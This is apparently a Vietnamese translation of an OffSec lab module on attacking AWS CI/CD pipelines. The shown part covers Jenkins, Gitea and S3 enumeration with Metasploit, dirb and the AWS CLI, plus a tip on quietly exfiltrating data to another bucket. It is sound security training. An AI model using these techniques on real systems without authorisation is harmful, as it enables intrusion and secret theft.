# Attacking AWS Cloud Infrastructure

# Tấn công hạ tầng AWS Cloud

---

Các hệ thống **Continuous Integration (CI)** và **Continuous Delivery (CD)** là các thành phần thiết yếu của các môi trường hiện đại dựa trên cloud, bao gồm cả các môi trường trên AWS. Các hệ thống này hỗ trợ việc triển khai ứng dụng một cách tự động, có thể lặp lại và đã được kiểm thử, đảm bảo độ ổn định và hiệu quả cao hơn. Để đạt được điều này, các pipeline CI/CD phải có quyền truy cập vào mã nguồn ứng dụng, secrets, và nhiều dịch vụ cũng như môi trường AWS khác nhau để phục vụ triển khai.

Tuy nhiên, việc tích hợp các hệ thống này vào môi trường AWS làm **mở rộng bề mặt tấn công**, khiến các pipeline CI/CD trở thành mục tiêu ưu tiên của các tác nhân độc hại. Việc compromise một hệ thống CI/CD có lỗ hổng trong AWS có thể dẫn đến **leo thang đặc quyền**, cho phép kẻ tấn công tiến sâu hơn vào hạ tầng cloud.

Vì các hệ thống CI/CD là mục tiêu rất lớn đối với kẻ tấn công, các tổ chức như **OWASP** đã tạo các danh sách “Top 10” về các rủi ro bảo mật lớn nhất trong hệ thống CI/CD, như được hiển thị bên dưới. Các danh sách này giúp tổ chức xác định và giảm thiểu các lỗ hổng có thể bị khai thác trong hạ tầng AWS của họ.

- CICD-SEC-1: Cơ chế kiểm soát luồng không đầy đủ
- CICD-SEC-2: Quản lý danh tính và truy cập không đầy đủ
- CICD-SEC-3: Lạm dụng chuỗi phụ thuộc
- CICD-SEC-4: Thực thi pipeline bị đầu độc (PPE)
- CICD-SEC-5: PBAC không đầy đủ (Pipeline-Based Access Controls)
- CICD-SEC-6: Vệ sinh thông tin xác thực không đầy đủ
- CICD-SEC-7: Cấu hình hệ thống không an toàn
- CICD-SEC-8: Sử dụng dịch vụ bên thứ ba không được quản trị
- CICD-SEC-9: Xác thực toàn vẹn artifact không đúng cách
- CICD-SEC-10: Logging và khả năng quan sát không đầy đủ

Module này được chia thành hai phần: nửa đầu tập trung vào **Leaked Secrets to Poisoned Pipeline**, và nửa sau về **Dependency Chain Abuse**.

Để duy trì một lab nhất quán, chúng ta sẽ không đề cập **CICD-SEC-8** vì nó yêu cầu một dịch vụ bên thứ ba, chẳng hạn như GitHub. Tuy nhiên, các khái niệm chúng ta sẽ xem xét cũng có thể được áp dụng cho rủi ro đó. Ngoài ra, chúng ta sẽ không đề cập **CICD-SEC-10** vì khả năng quan sát yêu cầu can thiệp thủ công, nằm ngoài phạm vi của Module này.

Trong phần đầu, chúng ta sẽ tập trung vào **CICD-SEC-4: Poisoned Pipeline Execution (PPE)**, **CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)**, và **CICD-SEC-6: Insufficient Credential Hygiene**.

**Poisoned Pipeline Execution (PPE)** là khi kẻ tấn công giành quyền kiểm soát script build/deploy, có thể dẫn đến reverse shell hoặc đánh cắp secrets.

**Insufficient Pipeline-Based Access Controls (PBAC)** nghĩa là pipeline thiếu cơ chế bảo vệ đúng cách đối với secrets và các tài sản nhạy cảm, có thể dẫn đến compromise.

**Insufficient Credential Hygiene** đề cập đến các kiểm soát yếu đối với secrets và tokens, khiến chúng dễ bị lộ hoặc bị khai thác để leo thang.

Cuối cùng, chúng ta sẽ khai thác một cấu hình sai của AWS S3 bucket để truy cập Git credentials, chỉnh sửa pipeline, và chèn một payload để đánh cắp secrets và compromise môi trường.

Trong nửa sau của module này, chúng ta sẽ đề cập **CICD-SEC-3: Dependency Chain Abuse**, **CICD-SEC-5: Insufficient Pipeline-Based Access Controls**, **CICD-SEC-7: Insecure System Configuration**, và **CICD-SEC-9: Improper Artifact Integrity Validation**.

**Dependency Chain Abuse** xảy ra khi một tác nhân độc hại đánh lừa hệ thống build tải xuống mã độc, hoặc bằng cách chiếm quyền một dependency chính thức hoặc tạo các package có tên tương tự.

**Insufficient Pipeline-Based Access Controls** nghĩa là các pipeline có quyền quá mức, khiến hệ thống dễ bị compromise.

**Insecure System Configuration** liên quan đến cấu hình sai hoặc mã không an toàn trong các ứng dụng pipeline.

**Improper Artifact Integrity Validation** cho phép kẻ tấn công chèn mã độc vào pipeline mà không có kiểm tra phù hợp.

Các rủi ro này, được OWASP nêu bật, thường chồng lấp và đóng vai trò như các hướng dẫn chung cho các lỗ hổng pipeline tiềm năng.

Trong module này, chúng ta sẽ tìm thông tin công khai đề cập đến một dependency bị thiếu khỏi public repository. Chúng ta sẽ khai thác điều này bằng cách phát hành một package độc hại, package này sẽ được builder tải xuống, cho phép mã của chúng ta chạy trong production.

Khi đã vào production, chúng ta sẽ quét mạng, phát hiện thêm các dịch vụ, và tunnel vào automation server. Tại đó, chúng ta sẽ tạo một tài khoản, khai thác một lỗ hổng plugin để lấy AWS keys, và tiếp tục cho đến khi tìm thấy một S3 bucket với một file Terraform state chứa admin AWS keys.

Như đã đề cập, chúng ta sẽ bao phủ tài liệu theo hai nửa trong Learning Module này. Chúng ta sẽ khám phá các Learning Unit sau:

**Leaked Secrets to Poisoned Pipeline:**

- Lab Design
- Information Gathering
- Dependency Chain Attack
- Compromising the Environment

**Dependency Chain Abuse:**

- Information Gathering
- Dependency Chain Attack
- Compromising the Environment

---

# 1. Về Public Cloud Labs

---

Trước khi bắt đầu, hãy xem qua một tuyên bố miễn trừ trách nhiệm tiêu chuẩn.

Module này sử dụng **Public Cloud Labs** của OffSec cho các thử thách và phần hướng dẫn. Public Cloud Labs của OffSec là một dạng môi trường lab nhằm bổ trợ trải nghiệm học tập bằng thực hành trực tiếp. Trái với các VM labs phổ biến hơn được tìm thấy ở những phần khác trong tài liệu học của OffSec (trong đó học viên sẽ kết nối vào lab thông qua VPN), học viên sử dụng Public Cloud Labs sẽ tương tác **trực tiếp** với môi trường cloud thông qua Internet.

OffSec tin tưởng mạnh mẽ vào lợi ích của việc học và luyện tập trong môi trường hands-on, và chúng tôi tin rằng OffSec Public Cloud Labs là một cơ hội tuyệt vời cho cả người học mới lẫn các practitioner muốn duy trì độ “sắc” kỹ năng.

Vui lòng lưu ý các điểm sau:

Môi trường lab không nên được sử dụng cho các hoạt động không được mô tả hoặc yêu cầu trong tài liệu học mà bạn gặp. Nó không được thiết kế để đóng vai trò như một “sân chơi” để thử thêm các hạng mục nằm ngoài phạm vi của learning module.

Môi trường lab không nên được sử dụng để thực hiện hành động chống lại bất kỳ asset nào bên ngoài lab. Điều này đặc biệt đáng lưu ý vì một số module có thể mô tả hoặc thậm chí trình diễn các cuộc tấn công vào các triển khai cloud dễ bị tổn thương với mục đích giải thích cách các triển khai đó có thể được bảo vệ.

Các quy tắc và yêu cầu hiện có về việc không chia sẻ tài liệu đào tạo của OffSec vẫn được áp dụng. Credentials và các chi tiết khác của lab không nhằm mục đích chia sẻ. OffSec giám sát hoạt động trong Public Cloud Labs (bao gồm mức sử dụng tài nguyên) và giám sát các sự kiện bất thường không liên quan đến các hoạt động được mô tả trong các learning module.

<aside>
⚠️

Các hoạt động bị gắn cờ là đáng ngờ sẽ dẫn đến một cuộc điều tra. Nếu cuộc điều tra xác định rằng một học viên đã hành động ngoài các hướng dẫn được mô tả ở trên, hoặc cố ý lạm dụng OffSec Public Cloud Labs, OffSec có thể lựa chọn thu hồi quyền truy cập của học viên đó vào OffSec Public Cloud Labs và/hoặc chấm dứt tài khoản của học viên.

</aside>

Tiến độ giữa các phiên sẽ không được lưu. Lưu ý rằng một Public Cloud Lab khi được khởi động lại sẽ trở về trạng thái ban đầu. Sau khi một giờ trôi qua, Public Cloud Lab sẽ hiển thị lời nhắc để xác định phiên làm việc còn đang hoạt động hay không. Nếu không có phản hồi, phiên lab sẽ kết thúc. Học viên có thể tiếp tục gia hạn một phiên thủ công tối đa đến mười giờ. Tài liệu học được thiết kế để phù hợp với các hạn chế của môi trường. Không có học viên nào được kỳ vọng hoặc bắt buộc phải hoàn thành tất cả các hoạt động trong một module trong một phiên lab duy nhất. Dù vậy, học viên có thể chọn chia nhỏ việc học thành nhiều phiên với lab. Chúng tôi khuyến nghị ghi chú lại chuỗi lệnh và các hành động đã hoàn thành trước đó để hỗ trợ việc khôi phục môi trường lab về trạng thái mà học viên đã để lại khi rời đi. Điều này đặc biệt quan trọng khi làm việc với các lab phức tạp đòi hỏi nhiều hành động.

---

# 2. Leaked Secrets to Poisoned Pipeline - Thiết kế Lab

---

Để tạo ra một thiết kế lab thực tế, nhiều dịch vụ cần được khởi chạy đồng thời. Điều này bao gồm dịch vụ **Source Code Management**, **automation server**, bất kỳ dịch vụ repository cần thiết nào, ứng dụng thực tế, và bất kỳ hạ tầng nào cần để hỗ trợ ứng dụng. Vì vậy, lab có thể mất khoảng **5 đến 10 phút** để khởi động hoàn toàn.

Để hỗ trợ các lab, chúng tôi đã bổ sung một vài thành phần phụ trợ giúp cho việc khai thác hệ thống CI/CD. Khi lab khởi động, chúng tôi sẽ cung cấp một **DNS server** có thể được cấu hình trên máy Kali cá nhân của bạn. Hệ thống DNS này sẽ được cấu hình sẵn với tất cả các host trong lab.

Vì chúng ta sẽ khai thác các ứng dụng trên cloud, chúng tôi cũng sẽ cung cấp một **Kali instance** có **public IP** để bắt shell. Instance này sẽ có thể truy cập qua **SSH** với username **kali** và một mật khẩu được chọn ngẫu nhiên cho mỗi lab.

Kali instance này chứa metapackage **kali-linux-headless**, cài đặt tất cả các công cụ mặc định nhưng không cài đặt GUI. Chúng tôi cũng sẽ thêm cấu hình DNS vào instance này để tránh cấu hình thêm. Mặc dù chúng ta có thể hoàn thành phần lớn lab trên instance này, bất kỳ phần nào yêu cầu GUI (ví dụ: tải một trang web trong trình duyệt) nên được thực hiện trên máy Kali cá nhân của bạn.

Các thành phần của lab này bao gồm:

**Gitea:** Đây là dịch vụ **Source Code Management (SCM)**. Mặc dù đây là một lựa chọn self-hosted, cuộc tấn công trong kịch bản này sẽ được thực hiện tương tự nếu đây là một SCM public như GitHub hoặc GitLab.

**Jenkins:** Đây là dịch vụ automation. Mặc dù chúng ta sẽ phải dùng cú pháp đặc thù của Jenkins để hiểu và viết workflow pipeline, các ý tưởng chung áp dụng cho hầu hết các dịch vụ automation khác.

**Application:** Đây là một ứng dụng generic mà chúng ta sẽ nhắm mục tiêu.

Các thành phần sẽ có thể truy cập tại các subdomain sau khi truy vấn custom DNS server:

| **Thành phần** | **Subdomain** |
| --- | --- |
| Gitea  | git.offseclab.io |
| Jenkins  | automation.offseclab.io |
| Application  | app.offseclab.io |

---

## 2.1. Truy cập Labs

---

Sau khi hoàn thành phần này, chúng ta sẽ có thể khởi động lab. Việc này cung cấp cho chúng ta:

- Một địa chỉ IP của DNS server
- Một địa chỉ IP của Kali
- Một mật khẩu Kali
- Một AWS account không có quyền (sẽ nói thêm về điều này sau)

Để truy cập các dịch vụ, chúng ta sẽ cần cấu hình máy Kali cá nhân của mình (không phải cloud instance) để sử dụng DNS server được cung cấp. Trong ví dụ này, DNS server của chúng ta sẽ được host tại **203.0.113.84**.

<aside>
📖

Không cần thêm VPN pack nào để truy cập DNS của AWS lab. Hãy đảm bảo rằng bạn không có kết nối VPN đang hoạt động trên máy Kali của mình.

</aside>

Chúng ta sẽ bắt đầu bằng cách liệt kê các kết nối trên máy Kali. Hãy dùng công cụ **nmcli** với subcommand **connection** để liệt kê các kết nối đang hoạt động. Output của bạn có thể khác tùy theo Kali được kết nối như thế nào (Wi-Fi, VM, v.v).

```bash
kali@kali:~$ nmcli connection
NAME                UUID                                  TYPE      DEVICE 
Wired connection 1  67f8ac63-7383-4dfd-ae42-262991b260d7  ethernet  eth0   
lo                  1284e5c4-6819-4896-8ad4-edeae32c64ce  loopback  lo 
```

                                                      *Listing 1 - Listing Network Connections*

Kết nối mạng chính của chúng ta có tên là **"Wired connection 1"**. Chúng ta sẽ dùng tên này trong lệnh tiếp theo để đặt cấu hình DNS. Sau đó, chúng ta sẽ thêm subcommand **modify** vào nmcli và chỉ định tên của kết nối mà chúng ta muốn chỉnh sửa. Hãy đặt thiết lập **ipv4.dns** thành IP của DNS server của chúng ta. Sau khi đặt xong, chúng ta sẽ dùng **systemctl** để restart dịch vụ **NetworkManager**.

```
kali@kali:~$ sudo nmcli connection modify "Wired connection 1" ipv4.dns "203.0.113.84"

kali@kali:~$ sudo systemctl restart NetworkManager
```

                                                              *Listing 2 - Setting DNS Server*

<aside>
💡

DNS server được host sẽ chỉ phản hồi cho domain **offseclab.io**. Bạn có thể chỉ định thêm các DNS server khác, như **1.1.1.1** hoặc **8.8.8.8**, bằng cách thêm chúng vào danh sách phân tách bằng dấu phẩy trong lệnh ở trên; ví dụ: `"203.0.113.84, 1.1.1.1, 8.8.8.8"`.

</aside>

Sau khi cấu hình, chúng ta có thể xác nhận thay đổi đã được áp dụng bằng cách kiểm tra IP DNS trong file **/etc/resolv.conf**. Chúng ta cũng sẽ dùng **nslookup** để kiểm tra xem DNS server có đang phản hồi các request phù hợp hay không.

```
kali@kali:~$ cat /etc/resolv.conf
# Generated by NetworkManager
search localdomain
nameserver 203.0.113.84
...

kali@kali:~$ nslookup git.offseclab.io
Server:         203.0.113.84
Address:        203.0.113.84#53

Non-authoritative answer:
Name:   git.offseclab.io
Address: 198.18.53.73
```

                                                        *Listing 3 - Verifying Changes for DNS*

Dựa trên Listing ở trên, chúng ta đã ghi các thay đổi vào file **resolv.conf** và truy vấn thành công một trong các DNS entry.

Mỗi lần lab restart sẽ cung cấp cho chúng ta một DNS IP mới và chúng ta sẽ cần chạy các lệnh ở trên để đặt nó. Vì DNS server sẽ bị hủy ở cuối lab, chúng ta sẽ cần xóa entry này khỏi các thiết lập bằng cách chạy lệnh nmcli trong Listing 2 với một chuỗi rỗng thay vì IP. Chúng ta sẽ minh họa điều này trong phần **Wrapping Up**.

---

# **3. Enumeration**

---

Giống như mọi đánh giá bảo mật khác, chúng ta nên bắt đầu bằng việc thu thập càng nhiều thông tin càng tốt về mục tiêu. Việc thu thập thông tin này là then chốt để có thể khai thác một ứng dụng một cách đúng đắn.

Learning Unit này bao gồm Learning Objective sau:

- Hiểu cách liệt kê một hệ thống CI/CD

---

## 3.1. Enumerating Jenkins

---

Chúng ta biết rằng chúng ta có một ứng dụng, Git server, và automation server. Hãy liệt kê automation server.

Chúng ta sẽ bắt đầu bằng cách truy cập ứng dụng tại **automation.offseclab.io**.

![image.png](image.png)

                                                              *Hình 1: Jenkins trong trình duyệt*

Trang chủ tự động chuyển hướng chúng ta tới trang đăng nhập. Thông thường, nếu Jenkins bật self-registration, chúng ta sẽ thấy tùy chọn đăng ký ở đây. Vì chúng ta không có tùy chọn đó, chúng ta có thể kết luận rằng hầu hết các automation assets đều nằm sau cơ chế xác thực. Tuy nhiên, điều đó sẽ không ngăn chúng ta liệt kê được càng nhiều càng tốt từ mục tiêu.

Metasploit có một module để liệt kê Jenkins. Hãy dùng nó để thu thập baseline về mục tiêu. Chúng ta sẽ bắt đầu bằng cách khởi tạo cơ sở dữ liệu Metasploit bằng **msfdb init**.

```
kali@kali:~$ sudo msfdb init
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

                                               *Listing 4 - Initializing the Metasploit Database*

Sau khi hoàn tất, chúng ta có thể khởi chạy Metasploit bằng lệnh **msfconsole** và flag **--quiet** để đảm bảo banner khởi động lớn không được hiển thị.

Khi Metasploit khởi động, chúng ta sẽ dùng module **jenkins_enum** và chạy **show options** để biết những gì cần cấu hình.

```
kali@kali:~$ msfconsole --quiet

msf6 > use auxiliary/scanner/http/jenkins_enum

msf6 auxiliary(scanner/http/jenkins_enum) > show options
                                                                                                                            
Module options (auxiliary/scanner/http/jenkins_enum):                                                                       
                                                                                                                            
   Name       Current Setting  Required  Description                                                                        
   ----       ---------------  --------  -----------                                                                        
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]                       
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/  
                                         using-metasploit.html                                                              
   RPORT      80               yes       The target port (TCP)                                                              
   SSL        false            no        Negotiate SSL/TLS for outgoing connections                                         
   TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application                                             
   THREADS    1                yes       The number of concurrent threads (max one per host)                                
   VHOST                       no        HTTP server virtual host                                                           
                                                                                                                            

View the full module info with the info, or info -d command.
```

                                            *Listing 5 - Selecting Module and Viewing Options*

Chúng ta sẽ cần cấu hình các tùy chọn **RHOSTS** và **TARGETURI**. Chúng ta biết host là URL mà chúng ta đã dùng để truy cập trang. Mặc dù TARGETURI mặc định là **/jenkins/**, chúng ta sẽ thấy rằng Jenkins đang chạy ở thư mục root. Hãy đặt TARGETURI thành root của trang.

```
msf6 auxiliary(scanner/http/jenkins_enum) > set RHOSTS automation.offseclab.io
RHOSTS => automation.offseclab.io

msf6 auxiliary(scanner/http/jenkins_enum) > set TARGETURI /
TARGETURI => /
```

                                                        *Listing 6 - Configuring the Module*

Tiếp theo, chúng ta cần chạy module để thu thập thông tin.

```
msf6 auxiliary(scanner/http/jenkins_enum) > run

[+] 198.18.53.73:80      - Jenkins Version 2.385
[*] /script restricted (403)
[*] /view/All/newJob restricted (403)
[*] /asynchPeople/ restricted (403)
[*] /systemInfo restricted (403)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

                                                               *Listing 7 - Running the Module*

Không may là cơ chế xác thực đã chặn phần còn lại của quá trình scan, vì vậy chúng ta chỉ thu thập được version. Tuy nhiên, thông tin này vẫn hữu ích vì chúng ta có thể tìm các exploit công khai.

Có vô số cách liệt kê khác mà chúng ta có thể thử. Tuy nhiên, để tránh dành quá nhiều thời gian cho một mục tiêu, hãy chuyển sang git server.

---

## 3.2. Enumerating the Git Server

---

Cách chúng ta tiếp cận việc liệt kê một Git server phụ thuộc vào ngữ cảnh. Nếu một tổ chức sử dụng một giải pháp SCM được host như GitHub hoặc GitLab, việc liệt kê của chúng ta sẽ thiên về thu thập thông tin open-source (OSINT) dựa trên các repo public, người dùng, v.v. Mặc dù các giải pháp được host này có thể tồn tại lỗ hổng, trong một đánh giá bảo mật có đạo đức, chúng ta sẽ tập trung vào các asset thuộc sở hữu của mục tiêu chứ không phải một bên thứ ba.

Nếu tổ chức tự host SCM của họ và nó nằm trong phạm vi, việc khai thác phần mềm SCM sẽ là một phần của đánh giá. Chúng ta cũng sẽ tìm kiếm bất kỳ thông tin bị lộ nào trên SCM self-hosted.

Ví dụ, việc thu thập thông tin về các repository bị lộ thường sẽ được đưa vào phạm vi cho cả SCM hosted và non-hosted. Tuy nhiên, brute force các mật khẩu thường dùng sẽ không hiệu quả trên SCM hosted, vì chúng thường có hàng trăm nghìn người dùng không liên quan đến một tổ chức. Trong một SCM self-hosted, brute force users và usernames có thể là một phần của đánh giá của chúng ta.

Hiện tại, hãy tập trung vào việc thu thập thông tin open source, và để brute forcing như một bài tập.

Chúng ta có thể bắt đầu bằng cách truy cập SCM server tại **git.offseclab.io** sau khi chúng ta đã khởi động thành công lab ban đầu.

![image.png](image%201.png)

                                                                       *Hình 2: Trang chủ SCM*

Trang chủ không cung cấp nhiều thông tin. Chúng ta sẽ thấy một nút **Explore** để tìm kiếm thông tin public và một nút **sign-in**. Nếu cuộn xuống, chúng ta sẽ thấy version của phần mềm SCM đang được sử dụng.

![image.png](image%202.png)

                                                                   *Hình 3: Phiên bản Gitea*

Hãy ghi chú version này để tìm các exploit công khai. Tiếp theo, chúng ta sẽ nhấp **Explore**.

![image.png](image%203.png)

                                                                      *Hình 4: SCM Explore*

Mặc dù tab **Repositories** trống, chúng ta có thể giả định rằng SCM server này rất có thể có repositories - nhưng chúng là private. Hãy kiểm tra tab **Users**.

![image.png](image%204.png)

                                                                      *Hình 5: SCM Users*

Chúng ta sẽ thấy năm user: **Billy**, **Jack**, **Lucy**, **Roger**, và **administrator**.

Đây là thông tin hữu ích cho chúng ta! Tuy nhiên, chúng ta vẫn chưa tìm thấy gì có thể khai thác. Chúng ta sẽ ghi chú lại điều này và chuyển sang liệt kê ứng dụng mục tiêu.

---

## **3.3. Enumerating the Application**

---

Chúng ta sẽ bắt đầu bằng cách truy cập ứng dụng tại **app.offseclab.io**.

![image.png](image%205.png)

                                                                 *Hình 6: Trang chủ của ứng dụng*

Trang chủ hiện tại của ứng dụng không chứa nhiều thông tin. Có thể có các HTTP route bổ sung không được liệt kê thông qua các liên kết. Hãy thực hiện một brute force nhanh bằng **dirb**. Chúng ta chỉ cần cung cấp URL mục tiêu cho lệnh **dirb**.

```
kali@kali:~$ dirb http://app.offseclab.io

....

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://app.offseclab.io/ ----
+ http://app.offseclab.io/index.html (CODE:200|SIZE:3189)                                                                  
...
```

                                                     *Listing 8 - Running dirb Against Target*

Không may, dirb không tìm thấy gì hữu ích. Hãy tiếp tục quá trình liệt kê.

Vì SCM và Automation server không phải là các ứng dụng custom, HTML source của chúng khó có khả năng chứa thông tin hữu ích. Tuy nhiên, trong ứng dụng này thì có lẽ là custom, nên source đặc biệt đáng quan tâm với chúng ta.

Hãy nhấp chuột phải vào trang và chọn **View Page Source**.

![image.png](image%206.png)

                                                                  *Hình 7: App HTML Source*

Thông tin thú vị nhất trong source là việc sử dụng các **S3 bucket** cho các hình ảnh.

```
<div class="carousel-item active">
    <img src="https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/images/bunny.jpg" class="d-block w-100" alt="...">
</div>
<div class="carousel-item">
    <img src="https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/images/golden-with-flower.jpg" class="d-block w-100"
        alt="...">
</div>
<div class="carousel-item">
    <img src="https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/images/kittens.jpg" class="d-block w-100" alt="...">
</div>
<div class="carousel-item">
    <img src="https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/images/puppy.jpg" class="d-block w-100" alt="...">
</div>
```

                                                        *Listing 9 - HTML source with S3 Bucket*

Tên S3 bucket sẽ khác trong lab của bạn.

Bằng cách xem source, chúng ta có thể xác định rằng bucket này có public access mở ít nhất đối với các hình ảnh này. Chúng ta có thể suy ra rằng bucket policy phải cho phép public access tới các hình ảnh này vì trang tải chúng và source không dùng presigned URLs. Hãy thử curl tới root của bucket để xem điều gì xảy ra. Chúng ta sẽ kỳ vọng nhận được danh sách đầy đủ của tất cả các file nếu bucket bật public access.

```
kali@kali:~$ curl https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com      
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>VFK5KNV3PV9B8SKJ</RequestId><HostId>0J13xDMdIwQB3e3HLcQvfYpsRe1MO0Bn0OVUgl+7wtbs2v3XOZZn98WKQ0lsyqmpgnv5FjSGFaE=</HostId></Error>
```

                                                 *Listing 10 - Using curl to list S3 bucket - Error*

Không may, chúng ta không thể liệt kê bucket bằng curl. Hãy thử thực hiện một enumeration nhanh bằng **dirb**. Chúng ta sẽ chỉ thử 50 entry đầu tiên của wordlist **/usr/share/wordlists/dirb/common.txt**. Mặc dù điều này sẽ rất xa mới đầy đủ, nó sẽ cho chúng ta một ý niệm tổng quát về cách bucket phản hồi với enumeration. Chúng ta sẽ bắt đầu bằng cách chỉ liệt kê 51 dòng đầu tiên (dòng đầu tiên là một dòng mới trống) và lưu nó vào một file mới. Sau đó chúng ta có thể dùng file đó làm wordlist cho lệnh dirb, đồng thời liệt kê S3 bucket làm target của chúng ta.

```
kali@kali:~$ head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt

kali@kali:~$ dirb https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com ./first50.txt
...
---- Scanning URL: https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/ ----
+ https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/.git/HEAD (CODE:200|SIZE:23)      
...
DOWNLOADED: 50 - FOUND: 1
```

                                                  *Listing 11 - Running Enumeration on S3 Bucket*

Trong lần enumeration nhanh này, chúng ta phát hiện mục tiêu có một thư mục **.git**. Từ đó, chúng ta có thể giả định rằng S3 bucket chứa toàn bộ một git repository. Điều này rất có thể sẽ cung cấp cho chúng ta rất nhiều thông tin nếu chúng ta có thể tải toàn bộ. Tuy nhiên, trích xuất dữ liệu bằng brute force enumeration cơ bản sẽ lãng phí thời gian vì nhiều file git quan trọng là các hash ngẫu nhiên. Thay vào đó, hãy pivot và liệt kê bằng các kỹ thuật khác.

Một kỹ thuật chúng ta có thể thử là dùng công cụ **AWS CLI** để liệt kê bucket. Cách này tận dụng một API khác và chúng ta có thể dùng credentials. S3 buckets thường bị cấu hình sai theo hướng bucket ACL chặn public access, nhưng cho phép truy cập đối với bất kỳ AWS authenticated user nào, kể cả nếu họ ở một AWS account khác. Điều này xảy ra vì tên của policy là **AuthenticatedUsers**, và nhiều quản trị viên hệ thống nhầm lẫn nó với authenticated users trong AWS account của họ.

Hãy dùng IAM account được cung cấp khi chúng ta khởi động lab để kiểm tra điều này.

Do hạn chế trong lab, IAM user này nằm trong cùng AWS account với S3 bucket. Tuy nhiên, nếu bạn có IAM user của riêng bạn trong một AWS account khác, bạn có thể dùng nó thay thế và nhận được cùng kết quả.

Chúng ta sẽ bắt đầu bằng cách cấu hình AWS CLI với các credentials được cung cấp. Khi được hỏi region, chúng ta sẽ dùng region được chỉ định trong URL của bucket, **us-east-1**.

```
kali@kali:~$ aws configure
AWS Access Key ID [None]: REDACTED_AWS_ACCESS_KEY_ID
AWS Secret Access Key [None]: REDACTED_AWS_SECRET_ACCESS_KEY
Default region name [None]: us-east-1
Default output format [None]: 
```

                                                               *Listing 12 - Configuring AWS CLI*

Tiếp theo, hãy dùng CLI để liệt kê bucket. Chúng ta sẽ chạy lệnh **aws** với subcommand **s3**. Chúng ta có thể dùng **ls** để liệt kê bucket.

```
kali@kali:~$ aws s3 ls staticcontent-lgudbhv8syu2tgbk
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2023-04-04 13:00:52        972 CONTRIBUTING.md
2023-04-04 13:00:52         79 Caddyfile
2023-04-04 13:00:52        407 Jenkinsfile
2023-04-04 13:00:52        850 README.md
2023-04-04 13:00:52        176 docker-compose.yml
```

                                                                *Listing 13 - Listing Bucket*

Tuyệt vời! Chúng ta đã có thể liệt kê nội dung của bucket. Tiếp theo, chúng ta sẽ tải bucket xuống và tìm secrets.

---

# 4. Phát hiện Secrets

---

Bây giờ chúng ta có thể liệt kê bucket và truy cập ít nhất một số file bên trong, hãy tìm secrets. Chúng ta sẽ làm điều này bằng cách kiểm tra những file nào chúng ta có thể và không thể tải xuống, sau đó tận dụng các công cụ để tìm kiếm dữ liệu nhạy cảm trong bucket.

Learning Unit này bao gồm Learning Objective sau:

- Phát hiện những file nào có thể truy cập được
- Phân tích Git history để phát hiện secrets

---

## 4.1. Tải xuống Bucket

---

Trước tiên, hãy xem lại nội dung chúng ta tìm thấy khi liệt kê bucket.

```
kali@kali:~$ aws s3 ls staticcontent-lgudbhv8syu2tgbk
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2023-04-04 13:00:52        972 CONTRIBUTING.md
2023-04-04 13:00:52         79 Caddyfile
2023-04-04 13:00:52        407 Jenkinsfile
2023-04-04 13:00:52        850 README.md
2023-04-04 13:00:52        176 docker-compose.yml
```

                                                                   *Listing 13 - Listing Bucket*

Trước hết, chúng ta có thể xác định đây rất có thể là toàn bộ một git repository dựa trên thư mục **.git**. Tiếp theo, chúng ta phát hiện một **Jenkinsfile** cho thấy đây có khả năng là một phần của pipeline. Chúng ta sẽ kiểm tra file này kỹ hơn sau. Chúng ta cũng thấy một thư mục **scripts** có thể sẽ thú vị.

Trước tiên hãy tải xuống tất cả nội dung mà chúng ta có thể từ bucket. Chúng ta biết mình có quyền truy cập thư mục **images/**, nhưng liệu chúng ta có truy cập được file **README.md** không? Hãy dùng lệnh **aws s3**, lần này với thao tác **cp** để copy **README.md** từ bucket **staticcontent-lgudbhv8syu2tgbk** về thư mục hiện tại. Chúng ta cũng cần thêm chỉ thị **s3://** vào tên bucket để hướng dẫn AWS CLI rằng chúng ta đang copy từ một S3 bucket chứ không phải một thư mục.

Nếu có một lượng lớn thông tin nhạy cảm có thể có giá trị, chúng ta có thể cố gắng exfiltrate dữ liệu bằng cách copy nó sang một AWS S3 bucket khác thay vì tải trực tiếp xuống.

Việc dùng lệnh **AWS S3 cp** cho phép truyền nhanh hơn giữa các bucket và cho chúng ta nhiều thời gian hơn để truy cập dữ liệu sau này mà không gây chú ý ngay lập tức. Luôn giám sát các hoạt động S3 bucket bất thường và áp dụng các chính sách kiểm soát truy cập nghiêm ngặt.

```bash
kali@kali:~$ aws s3 cp s3://staticcontent-lgudbhv8syu2tgbk/README.md ./
download: s3://staticcontent-lgudbhv8syu2tgbk/README.md to ./README.md
```

                                                                *Listing 13 - Listing Bucket*

Chúng ta đã có thể tải xuống README.md. Hãy điều tra nội dung của nó.

```
kali@kali:~$ cat README.md
# Static Content Repository

This repository holds static content.

While it only hold images for now, later it will hold PDFs and other digital assets.

Git probably isn't the best for this, but we need to have some form of version control on these assets later. 

## How to use

To use the content in this repository, simply clone or download the repository and access the files as needed. If you have access to the S3 bucket and would like to upload the content to the bucket, you can use the provided script:

./scripts/upload-to-s3.sh

This script will upload all the files in the repository to the specified S3 bucket.

## Contributing

If you would like to contribute to this repository, please fork the repository and submit a pull request with your changes. Please make sure to follow the contribution guidelines outlined in CONTRIBUTING.md.

# Collaborators
Lucy
Roger
```

                                                         *Listing 14 - Review README.md*

